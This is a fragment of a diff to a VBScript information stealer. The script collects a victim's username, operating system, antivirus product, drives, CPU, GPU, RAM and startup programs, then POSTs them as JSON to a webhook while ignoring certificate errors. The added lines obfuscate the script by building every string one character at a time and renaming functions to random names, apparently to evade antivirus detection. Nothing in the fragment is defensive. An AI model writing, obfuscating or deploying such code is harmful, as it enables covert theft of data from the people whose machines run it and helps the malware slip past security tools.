+       "*" & "*" & "U" & "s" & "e" & "r" & "n" & "a" & "m" & "e" & ":" & "*" & "*" & " " & k9p3q6x() & vbCrLf & _
+       "*" & "*" & "O" & "S" & ":" & "*" & "*" & " " & l2o8m4c() & vbCrLf & _
+       "*" & "*" & "A" & "r" & "c" & "h" & "i" & "t" & "e" & "c" & "t" & "u" & "r" & "e" & ":" & "*" & "*" & " " & b5v9r2t() & vbCrLf & _
+       "*" & "*" & "A" & "n" & "t" & "i" & "v" & "i" & "r" & "u" & "s" & ":" & "*" & "*" & " " & n7c1a8d() & vbCrLf & _
+       "*" & "*" & "D" & "r" & "i" & "v" & "e" & "s" & ":" & "*" & "*" & " " & h6y2u9j() & vbCrLf & _
+		"*" & "*" & "C" & "P" & "U" & ":" & "*" & "*" & " " & z1x5c9v() & vbCrLf & _
+	   "*" & "*" & "G" & "P" & "U" & ":" & "*" & "*" & " " & w4s8d3f() & vbCrLf & _
+	   "*" & "*" & "T" & "o" & "t" & "a" & "l" & " " & "R" & "A" & "M" & ":" & "*" & "*" & " " & t8e4w1q() & vbCrLf & _
+	   "*" & "*" & "R" & "A" & "M" & " " & "M" & "o" & "d" & "u" & "l" & "e" & ":" & "*" & "*" & " " & p3a7s2m() & vbCrLf & _
+	   "*" & "*" & "S" & "t" & "a" & "r" & "t" & "U" & "p" & " " & "P" & "r" & "o" & "r" & "g" & "a" & "m" & "s" & ":" & "*" & "*" & " " & y2t6r8e() & vbCrLf & _
+	   "*" & "*" & "D" & "a" & "r" & "k" & "E" & "v" & "i" & "l" & ":" & "*" & "*" & " " & e7b3n9m()
 
 
-escapedInfo = EscapeJson(info)
+escapedInfo = s5h9v2c(infoData)
 
-data = "{""content"":""" & escapedInfo & """,""username"":""" & GetHostName() & """}"
-Set http = CreateObject("MSXML2.ServerXMLHTTP")
-http.setOption 2, 13056
-http.open "POST", webhookUrl, False
-http.setRequestHeader "Content-Type", "application/json"
-http.send data
+jsonData = "{" & """" & "c" & "o" & "n" & "t" & "e" & "n" & "t" & """" & ":" & """" & escapedInfo & """" & "," & """" & "u" & "s" & "e" & "r" & "n" & "a" & "m" & "e" & """" & ":" & """" & g4h8s1w() & """" & "}"
+Set httpObj = CreateObject("M" & "S" & "X" & "M" & "L" & "2" & "." & "S" & "e" & "r" & "v" & "e" & "r" & "X" & "M" & "L" & "H" & "T" & "T" & "P")
+httpObj.setOption 2, 13056
+httpObj.open "P" & "O" & "S" & "T", webhookStr, False
+httpObj.setRequestHeader "C" & "o" & "n" & "t" & "e" & "n" & "t" & "-" & "T" & "y" & "p" & "e", "a" & "p" & "p" & "l" & "i" & "c" & "a" & "t" & "i" & "o" & "n" & "/" & "j" & "s" & "o" & "n"
+httpObj.send jsonData
